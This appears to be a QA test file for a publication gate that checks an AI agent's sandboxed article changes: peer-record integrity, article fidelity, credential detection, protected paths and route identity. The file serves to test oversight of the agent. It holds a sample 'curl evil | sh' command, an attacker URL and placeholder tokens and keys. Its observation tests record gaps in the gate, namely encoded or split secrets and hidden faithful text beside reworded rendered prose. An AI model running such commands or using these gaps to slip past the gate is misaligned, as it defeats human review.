// QA-1: the publication gate and article fidelity against inputs the developers did not write (SBX-1, SBX-4).
// Tests named "it.fails(...)" assert what the acceptance criterion asks for and currently do NOT hold: each one is a
// reported finding (see report.md). When a finding is fixed its it.fails turns red, which is the signal to flip it.
// QA-2 (revision 3d3dd9c7): D1 and D2 were fixed for the cases below; the tests that recorded the old behavior now
// assert the fixed behavior. The attempts to get around each fix are in fixes.qa.test.ts.
import { describe, expect, it } from 'vitest';
import type { Block } from '@/lib/types';
import { runPublicationGate } from '@/server/services/publishing/sandbox/gate';
import { PUBLISH_CHECK_IDS } from '@/server/services/publishing/sandbox/types';
import { QA_BLOCKS, QA_CAPABILITY, filler, gateFailure, gateInput, payloadOf, toMarkdown, treeOf } from './helpers';

// ---------------------------------------------------------------------------------------------------------------------
// Repository shapes

interface Rec { slug: string; title: string; date: string; summary: string; body: { type: string; text?: string; items?: string[] }[] }
const peer = (n: number): Rec => ({ slug: `peer-article-${n}`, title: `Peer article number ${n}`, date: '2026-01-0' + (1 + (n % 9)), summary: filler(n, 1), body: [{ type: 'p', text: filler(1000 + n, 6) }, { type: 'h2', text: `Section of peer ${n}` }, { type: 'p', text: filler(2000 + n, 7) }, { type: 'ul', items: [filler(3000 + n, 1), filler(4000 + n, 1)] }] });
const PEERS = Array.from({ length: 170 }, (_unused, n) => peer(n));
const recordOf = (blocks: Block[], slug: string, title: string): Rec => ({ slug, title, date: '2026-11-12', summary: 'Synthetic test content.', body: blocks.map(([kind, value]) => kind === 'ul' ? { type: 'ul', items: value as string[] } : { type: kind, text: value as string }) });

/** Shape 1: one pretty-printed JSON document, { "articles": [ ... ] }, over 150 KB. */
const NESTED_PATH = 'site/data/articles.json';
const nested = (records: Rec[]) => JSON.stringify({ generatedBy: 'hand', articles: records }, null, 2) + '\n';
/** Shape 2: a JSON array with one record per line. */
const LINES_PATH = 'site/data/posts.json';
const lines = (records: Rec[]) => '[\n' + records.map(record => JSON.stringify(record)).join(',\n') + '\n]\n';
const REPO = () => treeOf({
  [NESTED_PATH]: nested(PEERS),
  [LINES_PATH]: lines(PEERS),
  'site/pages/articles/[slug].tsx': 'import data from "../../data/articles.json";\nexport default function Page() { return null; }\n',
  'content/blog/first-post.md': '---\ntitle: "First post"\ndate: 2026-01-01\n---\n\nA first post.\n',
  'README.md': '# QA site\n',
});
const P = payloadOf();
const ROUTE = `/articles/${P.slug}`;
const goodNested = (blocks: Block[] = QA_BLOCKS) => ({ files: { [NESTED_PATH]: nested([...PEERS, recordOf(blocks, P.slug, P.title)]) }, articlePath: NESTED_PATH, route: ROUTE });
const goodLines = (records: Rec[] = PEERS) => ({ files: { [LINES_PATH]: lines([...records, recordOf(QA_BLOCKS, P.slug, P.title)]) }, articlePath: LINES_PATH, route: ROUTE });
const mdPath = `content/blog/${P.slug}.md`;
const frontmatter = `---\ntitle: "${P.title}"\ndate: ${P.date}\ndescription: "${P.meta}"\n---\n\n`;
const asMarkdown = (blocks: Block[] = QA_BLOCKS, transform: (text: string) => string = text => text) => ({ files: { [mdPath]: frontmatter + transform(toMarkdown(blocks)) }, articlePath: mdPath, route: `/blog/${P.slug}` });
const change = (index: number, edit: (text: string) => string): Block[] => QA_BLOCKS.map((block, at) => (at === index ? [block[0], edit(block[1] as string)] as Block : block));
const changeItem = (index: number, item: number, edit: (text: string) => string): Block[] => QA_BLOCKS.map((block, at) => (at === index ? ['ul', (block[1] as string[]).map((text, i) => (i === item ? edit(text) : text))] as Block : block));

describe('SBX-1: a registry shape the developers did not use (one JSON document over 100 KB)', () => {
  it('the fixture really is a single authored file over 150 KB', () => {
    expect(Buffer.byteLength(nested(PEERS))).toBeGreaterThan(150_000);
  });

  it('accepts an append of exactly one record, with every peer record byte-identical', async () => {
    const tree = REPO();
    const gated = await runPublicationGate(gateInput(tree, P, goodNested()));
    expect(gated.unchanged).toBe(false);
    expect(gated.files.map(file => file.path)).toEqual([NESTED_PATH]);
    const committed = JSON.parse(gated.files[0].content) as { articles: Rec[] };
    expect(committed.articles).toHaveLength(PEERS.length + 1);
    expect(committed.articles.slice(0, PEERS.length)).toEqual(PEERS);
    expect(committed.articles.at(-1)!.slug).toBe(P.slug);
    // Byte-level: the committed text is the original with one block of lines inserted before the closing bracket.
    const original = nested(PEERS); const final = gated.files[0].content;
    const tail = '\n  ]\n}\n';
    expect(original.endsWith(tail) && final.endsWith(tail)).toBe(true);
    expect(final.startsWith(original.slice(0, -tail.length))).toBe(true);
    expect(gated.checks.map(check => check.id).sort()).toEqual([...PUBLISH_CHECK_IDS].sort());
    expect(gated.checks.every(check => check.outcome === 'passed')).toBe(true);
    expect(gated.checks.find(check => check.id === 'peer-content')!.detail).toMatch(/0 of \d+ original lines removed or altered/);
  });

  it('refuses the same append when a whole multi-line peer record is deleted', async () => {
    const without = PEERS.filter((_record, n) => n !== 40);
    const failure = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, { files: { [NESTED_PATH]: nested([...without, recordOf(QA_BLOCKS, P.slug, P.title)]) }, articlePath: NESTED_PATH, route: ROUTE })));
    expect(failure.code).toBe('peer-content-changed');
    expect(failure.reason).not.toContain('peer-article-40');
  });

  it('refuses the append when every peer is re-serialised with different indentation', async () => {
    const reformatted = JSON.stringify({ generatedBy: 'hand', articles: [...PEERS, recordOf(QA_BLOCKS, P.slug, P.title)] }, null, 4) + '\n';
    const failure = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, { files: { [NESTED_PATH]: reformatted }, articlePath: NESTED_PATH, route: ROUTE })));
    expect(failure.code).toBe('peer-content-changed');
  });

  it('refuses a second copy of the article in another file (the article must be present once)', async () => {
    const twice = { files: { ...goodNested().files, [mdPath]: frontmatter + toMarkdown(QA_BLOCKS) }, articlePath: NESTED_PATH, route: ROUTE };
    const failure = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, twice)));
    expect(failure.code).toBe('article-fidelity');
    expect(failure.reason).toMatch(/more than once/);
  });

  // D1, reported in QA-1 and fixed in 3d3dd9c7: for a new article an existing line is either altered (a near-identical
  // line takes its place in the same hunk) or removed, and none may be removed.
  it('D1: refuses a new-article change that deletes three whole peer records from a one-record-per-line registry', async () => {
    const without = PEERS.filter((_record, n) => ![10, 77, 140].includes(n));
    const failure = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, goodLines(without))));
    expect(failure.code).toBe('peer-content-changed');
    expect(failure.reason).toMatch(/has 3 of its 172 existing lines removed and 1 altered; a new article may remove none/);
    expect(failure.diagnostic).toMatchObject({ actual: 3, limit: 0, path: LINES_PATH });
    expect(failure.reason).not.toContain('peer-article-77');
  });
  it('D1: the honest append to that registry still passes, counted as one altered line (the comma) and none removed', async () => {
    const gated = await runPublicationGate(gateInput(REPO(), P, goodLines()));
    const committed = JSON.parse(gated.files[0].content) as Rec[];
    expect(committed).toHaveLength(PEERS.length + 1);
    expect(committed.slice(0, PEERS.length)).toEqual(PEERS);
    expect(gated.checks.find(check => check.id === 'peer-content')!.detail).toMatch(/1 of 172 original lines removed or altered \(1 altered, 0 removed; limit 6 altered per file and 24 in all, 0 removed\)/);
  });
  it('D1: refuses the outright replacement of an existing five-line file', async () => {
    const tree = treeOf({ 'content/blog/first-post.md': 'x\n', 'site/lib/featured.ts': "export const featured = [\n  'peer-article-1',\n  'peer-article-2',\n  'peer-article-3',\n];\n" });
    const failure = await gateFailure(() => runPublicationGate(gateInput(tree, P, { ...asMarkdown(), files: { ...asMarkdown().files, 'site/lib/featured.ts': `export const featured = ['${P.slug}'];\n` } })));
    expect(failure.code).toBe('peer-content-changed');
    expect(failure.reason).toMatch(/has 4 of its 5 existing lines removed and 1 altered/);
  });
  // QA-1 recorded this as a risk the PM had accepted. It is now refused, which is stricter and is the intended behavior.
  it('D1: a peer record title rewritten in place (1 line) is refused', async () => {
    const altered = PEERS.map((record, n) => (n === 5 ? { ...record, title: 'A title the agent rewrote' } : record));
    const failure = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, { files: { [NESTED_PATH]: nested([...altered, recordOf(QA_BLOCKS, P.slug, P.title)]) }, articlePath: NESTED_PATH, route: ROUTE })));
    expect(failure.code).toBe('peer-content-changed');
    expect(failure.reason).toMatch(/has 1 of its 4595 existing lines removed; a new article may remove none/);
  });
});

describe('SBX-4 fidelity: format conversion is tolerated', () => {
  it('accepts the article as YAML front matter plus Markdown in a new file', async () => {
    const gated = await runPublicationGate(gateInput(REPO(), P, asMarkdown()));
    expect(gated.files).toHaveLength(1);
    expect(gated.checks.find(check => check.id === 'article-fidelity')!.detail).toMatch(/7 of 7 paragraphs and 6 of 6 list items present, 13 of them word for word; 4 of 4 headings present/);
  });
  it('accepts punctuation conversion a repository rule can force: no em dash, straight quotes, escaped ampersand, hard wraps', async () => {
    const converted = (text: string) => text.replace(/—/g, '-').replace(/[“”]/g, '"').replace(/&/g, '&amp;').replace(/(.{70,90}?) /g, '$1\n');
    const gated = await runPublicationGate(gateInput(REPO(), P, asMarkdown(QA_BLOCKS, converted)));
    expect(gated.checks.find(check => check.id === 'article-fidelity')!.detail).toMatch(/13 of them word for word/);
  });
  it('accepts the article inside MDX components and JSX string props', async () => {
    const mdx = `export const meta = { title: ${JSON.stringify(P.title)} };\n\n<Article>\n` + QA_BLOCKS.map(([kind, value]) => kind === 'ul' ? `<List items={${JSON.stringify(value)}} />` : kind === 'p' ? `<P>{${JSON.stringify(value)}}</P>` : `<Heading level="${kind}">${String(value).replace(/&/g, '&amp;')}</Heading>`).join('\n\n') + '\n</Article>\n';
    const path = `content/blog/${P.slug}.mdx`;
    const gated = await runPublicationGate(gateInput(REPO(), P, { files: { [path]: mdx }, articlePath: path, route: `/blog/${P.slug}` }));
    expect(gated.checks.find(check => check.id === 'article-fidelity')!.detail).toMatch(/7 of 7 paragraphs and 6 of 6 list items present/);
  });
});

describe('SBX-4 fidelity: a subtly changed article is refused', () => {
  const refused = async (blocks: Block[]) => (await gateFailure(() => runPublicationGate(gateInput(REPO(), P, asMarkdown(blocks))))).code;
  it.each([
    ['one word replaced by a synonym in a long paragraph', change(3, text => text.replace('overflowing', 'spilling'))],
    ['a number changed (17 degrees to 18)', change(6, text => text.replace('17 degrees', '18 degrees'))],
    ['a price changed (about 12 to about 15)', change(8, text => text.replace('about 12', 'about 15'))],
    ['two adjacent words swapped', change(11, text => text.replace('a roofer', 'roofer a'))],
    ['the last sentence of a paragraph dropped', change(11, text => text.replace(/ A stain that never changes.*$/, ''))],
    ['the first clause of a paragraph dropped', change(0, text => text.replace('Tidewater Row is a terrace of forty narrow houses beside the old rope works, and ', ''))],
    ['a measurement changed in a list item (5 mm to 6 mm)', changeItem(4, 2, text => text.replace('5 mm', '6 mm'))],
    ['a threshold changed in a short list item (three days to two)', changeItem(9, 2, text => text.replace('three', 'two'))],
    ['one whole paragraph omitted', QA_BLOCKS.filter((_block, at) => at !== 12)],
    ['one list item omitted', changeItem(4, 1, () => '').map(block => (block[0] === 'ul' ? ['ul', (block[1] as string[]).filter(Boolean)] as Block : block))],
    ['two paragraphs merged into a summary sentence', [...QA_BLOCKS.slice(0, 11), ['p', 'Call a tradesperson when a stain changes, and photograph every mark monthly.'] as Block]],
  ])('%s', async (_label, blocks) => {
    expect(await refused(blocks)).toBe('article-fidelity');
  });

  it('refuses paragraphs published in a different order', async () => {
    const paragraphs = QA_BLOCKS.filter(block => block[0] === 'p');
    const reversed = [...paragraphs].reverse(); let next = 0;
    const blocks = QA_BLOCKS.map(block => (block[0] === 'p' ? reversed[next++] : block));
    expect(await refused(blocks)).toBe('article-fidelity');
  });

  it('a fidelity refusal names unit positions only and carries no article text', async () => {
    const failure = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, asMarkdown(change(6, text => text.replace('17 degrees', '18 degrees'))))));
    const said = JSON.stringify(failure.diagnostic);
    expect(said).toMatch(/paragraph 8/);
    for (const phrase of ['trickle vents', 'extractor', '17 degrees', '18 degrees', 'Tidewater']) expect(said).not.toContain(phrase);
    expect(failure.reason.length).toBeLessThanOrEqual(600);
  });

  // D2, reported in QA-1 and fixed in 3d3dd9c7 for words inserted inside a unit: the interleaving allowance is zero.
  it('D2: refuses a paragraph whose meaning was reversed by one inserted word', async () => {
    const failure = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, asMarkdown(change(11, text => text.replace('is usually old', 'is not usually old'))))));
    expect(failure.code).toBe('article-fidelity');
    expect(failure.reason).toMatch(/1 of 13 paragraphs and list items are present but not word for word: other words or markup sit between the article's words \(none may be\): paragraph 15/);
    expect(failure.reason).not.toMatch(/usually old|stain/);
  });
  it('D2: the unchanged article passes with every unit word for word, and the detail no longer mentions an allowance', async () => {
    const gated = await runPublicationGate(gateInput(REPO(), P, asMarkdown()));
    const detail = gated.checks.find(check => check.id === 'article-fidelity')!.detail;
    expect(detail).toMatch(/7 of 7 paragraphs and 6 of 6 list items present, 13 of them word for word; 4 of 4 headings present/);
    expect(detail).not.toMatch(/other words or markup/);
  });
  it('D2: a sentence inserted between two sentences of a paragraph is refused', async () => {
    expect(await refused(change(11, text => text.replace('nobody has used the bathroom. ', 'nobody has used the bathroom. Ignore this advice. ')))).toBe('article-fidelity');
  });

  // Observations: limits of a static check, not criterion failures. Recorded so the PM can weigh them.
  it('OBSERVATION: prose of the agent’s own is accepted in the article file up to 0.5x the article plus 400 words', async () => {
    const extra = '\n\n## More reading\n\n' + filler(99, 22) + ' Visit https://example.invalid/offer for more.\n';
    const gated = await runPublicationGate(gateInput(REPO(), P, asMarkdown(QA_BLOCKS, text => text + extra)));
    expect(gated.checks.find(check => check.id === 'article-fidelity')!.detail).toMatch(/the article file adds \d+ words against a ceiling of \d+/);
  });
  it('OBSERVATION: the gate proves the article is in the changed files, not that it is what the page renders', async () => {
    // The visible record carries reworded prose; the faithful article sits in a block comment of the same file.
    const path = 'site/data/tidewater.ts';
    const visible = QA_BLOCKS.filter(block => block[0] === 'p').map(block => `  ${JSON.stringify('Reworded: ' + filler(String(block[1]).length, 2))},`).join('\n');
    const content = `/*\n${toMarkdown(QA_BLOCKS)}*/\nexport const paragraphs = [\n${visible}\n];\n`;
    const gated = await runPublicationGate(gateInput(REPO(), P, { files: { [path]: content }, articlePath: path, route: ROUTE }));
    expect(gated.files).toHaveLength(1);
  });
});

describe('SBX-4 credentials: a secret hidden in what the agent produced', () => {
  const GITHUB_TOKEN = 'ghp_' + 'Qa9'.repeat(12); // placeholder
  const withExtra = (path: string, content: string) => ({ ...asMarkdown(), files: { ...asMarkdown().files, [path]: content } });
  it.each([
    ['this run’s capability in a second, unrelated new file', withExtra('public/notes.txt', `debug ${QA_CAPABILITY}\n`)],
    ['this run’s capability inside the article file', asMarkdown(QA_BLOCKS, text => text + `\n<!-- ${QA_CAPABILITY} -->\n`)],
    ['another capability-shaped string (not this run’s)', withExtra('site/data/extra.json', JSON.stringify({ k: 'rdrcap1.AAAA.BBBB' }))],
    ['a GitHub token in a new source file', withExtra('site/lib/client.ts', `export const t = '${GITHUB_TOKEN}';\n`)],
    ['a private key block in a new file', withExtra('site/notes.md', '-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----\n')],
    ['an Anthropic-style key in a new file', withExtra('site/notes.md', 'key sk-ant-' + 'qa0'.repeat(12) + '\n')],
  ])('refuses %s, and the diagnostic does not repeat it', async (_label, output) => {
    const failure = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, output)));
    expect(failure.code).toBe('credential-detected');
    const said = JSON.stringify(failure.diagnostic) + failure.error.message;
    for (const secret of [QA_CAPABILITY, GITHUB_TOKEN, 'rdrcap1.', 'sk-ant-', 'PRIVATE KEY']) expect(said).not.toContain(secret);
  });
  it('refuses a capability used as a file name or in the reported identity', async () => {
    const named = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, withExtra(`site/${QA_CAPABILITY}.md`, 'x\n'))));
    expect(named.code).toBe('credential-detected');
    expect(JSON.stringify(named.diagnostic)).not.toContain('rdrcap1.');
    const routed = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, { ...asMarkdown(), route: `/blog/${QA_CAPABILITY}` })));
    expect(routed.code).toBe('credential-detected');
  });
  it('OBSERVATION: an encoded or split capability is not recognised (it is useless outside the sandbox and expires with the attempt)', async () => {
    const encoded = Buffer.from(QA_CAPABILITY).toString('base64');
    const gated = await runPublicationGate(gateInput(REPO(), P, withExtra('site/notes.md', `${encoded}\n${QA_CAPABILITY.slice(0, 7)}\n${QA_CAPABILITY.slice(7)}\n`)));
    expect(gated.files).toHaveLength(2);
  });
});

describe('SBX-4 paths: links, submodules and protected locations', () => {
  const link = { path: 'content/latest.md', type: 'blob', mode: '120000', sha: 'a'.repeat(40), size: 20 };
  const linkedDirectory = { path: 'content/linked', type: 'blob', mode: '120000', sha: 'b'.repeat(40), size: 12 };
  const submodule = { path: 'themes/vendor-theme', type: 'commit', mode: '160000', sha: 'c'.repeat(40) };
  const tree = () => treeOf({ 'content/blog/first-post.md': 'x\n', 'README.md': '# QA\n' }, [link, linkedDirectory, submodule]);
  const at = (path: string) => ({ files: { [path]: frontmatter + toMarkdown(QA_BLOCKS) }, articlePath: path, route: `/blog/${P.slug}` });
  it.each([
    ['a path that is a symbolic link in the pinned tree', 'content/latest.md', 'non-regular-file'],
    ['a new file under a symbolic link to a directory', `content/linked/${P.slug}.md`, 'non-regular-file'],
    ['a new file inside a submodule', `themes/vendor-theme/content/${P.slug}.md`, 'non-regular-file'],
    ['a path that climbs out of the repository', `content/../../${P.slug}.md`, 'protected-path'],
    ['an absolute path', `/workspace/repo/content/${P.slug}.md`, 'protected-path'],
    ['a backslash path', `content\\blog\\${P.slug}.md`, 'protected-path'],
    ['a CI workflow', '.github/workflows/publish.yml', 'protected-path'],
    ['a dependency manifest', 'package.json', 'protected-path'],
    ['an environment file', '.env.production', 'protected-path'],
    ['a deployment file', 'vercel.json', 'protected-path'],
    ['request middleware', 'middleware.ts', 'protected-path'],
    ['an auth route', 'src/app/api/auth/[...nextauth]/route.ts', 'protected-path'],
    ['git metadata', '.git/hooks/pre-commit', 'protected-path'],
  ])('refuses %s', async (_label, path, code) => {
    const failure = await gateFailure(() => runPublicationGate(gateInput(tree(), P, at(path))));
    expect(failure.code).toBe(code);
  });
  it('refuses a candidate the collector could not download as a regular file (for example a link made in the sandbox)', async () => {
    const input = gateInput(tree(), P, at(mdPath));
    input.finals.delete(mdPath);
    expect((await gateFailure(() => runPublicationGate(input))).code).toBe('non-regular-file');
  });
  it('refuses a file changed from text to bytes that are not UTF-8', async () => {
    const failure = await gateFailure(() => runPublicationGate(gateInput(tree(), P, { files: { [mdPath]: frontmatter + toMarkdown(QA_BLOCKS), 'content/blog/first-post.md': Buffer.from([0xff, 0xfe, 0x00, 0x41]) }, articlePath: mdPath, route: `/blog/${P.slug}` })));
    expect(failure.code).toBe('syntax-invalid');
  });
});

describe('SBX-4 identity: a refresh keeps its route', () => {
  const HUBS_PATH = 'apps/site/guides/hubs.ts';
  const hub = (slug: string, body: string[]) => `  {\n    slug: '${slug}',\n    title: 'Guide ${slug}',\n    sections: [\n${body.map(text => `      ${JSON.stringify(text)},`).join('\n')}\n    ],\n  },\n`;
  const hubs = (records: string[]) => `export const HUBS = [\n${records.join('')}];\n`;
  const peers = ['roof-care', 'window-care', 'garden-walls'].map((slug, n) => hub(slug, [filler(n + 1, 5), filler(n + 11, 5)]));
  const target = hub('dry-terrace', [filler(50, 6), filler(51, 6)]);
  const tree = () => treeOf({ [HUBS_PATH]: hubs([peers[0], target, peers[1], peers[2]]) });
  const refreshed = hub('dry-terrace', QA_BLOCKS.flatMap(([kind, value]) => (kind === 'ul' ? (value as string[]) : [value as string])));
  const output = (route: string, records = [peers[0], refreshed, peers[1], peers[2]]) => ({ files: { [HUBS_PATH]: hubs(records) }, articlePath: HUBS_PATH, route, slug: 'dry-terrace' });
  const refresh = (refreshUrl: string) => payloadOf(QA_BLOCKS, { mode: 'refresh', refreshUrl, canonical: refreshUrl });

  it.each([
    ['an absolute address', 'https://www.example.test/guides/dry-terrace', '/guides/dry-terrace'],
    ['a root-relative address (how older calendar rows stored it)', '/guides/dry-terrace', '/guides/dry-terrace'],
    ['a trailing slash and tracking parameters', 'https://www.example.test/guides/dry-terrace/?utm_source=x', '/guides/dry-terrace'],
  ])('accepts a typed hub record replaced in place when the route is unchanged: %s', async (_label, refreshUrl, route) => {
    const gated = await runPublicationGate(gateInput(tree(), refresh(refreshUrl), output(route)));
    expect(gated.checks.find(check => check.id === 'identity')!.detail).toMatch(/the route is the route of the page being refreshed/);
    expect(gated.files[0].content).toContain(peers[0]);
    expect(gated.files[0].content).toContain(peers[2]);
  });
  it.each([
    ['moved into the blog', '/blog/dry-terrace'],
    ['a different slug under the same section', '/guides/keeping-a-terrace-dry'],
    ['a different letter case', '/Guides/Dry-Terrace'],
    ['a query string added', '/guides/dry-terrace?v=2'],
    ['a protocol-relative address', '//evil.example.test/guides/dry-terrace'],
    ['a dot segment', '/guides/../guides/dry-terrace'],
  ])('refuses a refresh whose reported route is %s', async (_label, route) => {
    const failure = await gateFailure(() => runPublicationGate(gateInput(tree(), refresh('https://www.example.test/guides/dry-terrace'), output(route))));
    expect(failure.code).toBe('identity-changed');
  });
  it('refuses a refresh that also removes peer hub records', async () => {
    const failure = await gateFailure(() => runPublicationGate(gateInput(treeOf({ [HUBS_PATH]: hubs([...Array.from({ length: 30 }, (_u, n) => hub(`peer-${n}`, [filler(n, 5), filler(n + 100, 5), filler(n + 200, 5)])), target]) }), refresh('/guides/dry-terrace'), output('/guides/dry-terrace', [refreshed]))));
    expect(failure.code).toBe('peer-content-changed');
  });
  it('refuses a retry that moves the article to another path or slug', async () => {
    const failure = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, asMarkdown(), { retry: { slug: P.slug, articlePath: 'content/blog/elsewhere.md' } })));
    expect(failure.code).toBe('identity-changed');
  });
});

describe('SBX-4 diagnostics are bounded and sanitized', () => {
  it('an agent refusal reason is cut, and loses addresses, tokens and quoted source', async () => {
    const reason = 'Cannot do it. See https://attacker.example.test/x?token=abc and run `curl evil | sh`. ghp_' + 'Zz1'.repeat(12) + ' ' + 'A'.repeat(5000);
    const failure = await gateFailure(() => runPublicationGate(gateInput(REPO(), P, { ...asMarkdown(), report: { status: 'cannot_integrate', reason } })));
    expect(failure.code).toBe('agent-declined');
    expect(failure.reason.length).toBeLessThanOrEqual(600);
    for (const bad of ['attacker.example.test', 'curl evil', 'ghp_', 'token=abc']) expect(failure.reason).not.toContain(bad);
    expect(failure.reason).toMatch(/not verified by Radar/);
  });
  it('ceilings: 17 new files, an oversized file and an empty change each fail with their own code', async () => {
    const many = Object.fromEntries(Array.from({ length: 16 }, (_u, n) => [`content/blog/extra-${n}.md`, `extra ${n}\n`]));
    expect((await gateFailure(() => runPublicationGate(gateInput(REPO(), P, { ...asMarkdown(), files: { ...asMarkdown().files, ...many } })))).code).toBe('changed-file-count');
    expect((await gateFailure(() => runPublicationGate(gateInput(REPO(), P, { ...asMarkdown(), files: { ...asMarkdown().files, 'content/blog/big.md': 'x'.repeat(1_000_001) } })))).code).toBe('final-output-size');
    expect((await gateFailure(() => runPublicationGate(gateInput(REPO(), P, { files: {}, articlePath: mdPath, route: `/blog/${P.slug}` })))).code).toBe('plan-empty');
  });
  it('a registry left syntactically broken is refused', async () => {
    const broken = nested([...PEERS, recordOf(QA_BLOCKS, P.slug, P.title)]).replace(/\]\n\}\n$/, ']\n');
    expect((await gateFailure(() => runPublicationGate(gateInput(REPO(), P, { files: { [NESTED_PATH]: broken }, articlePath: NESTED_PATH, route: ROUTE })))).code).toBe('syntax-invalid');
  });
});
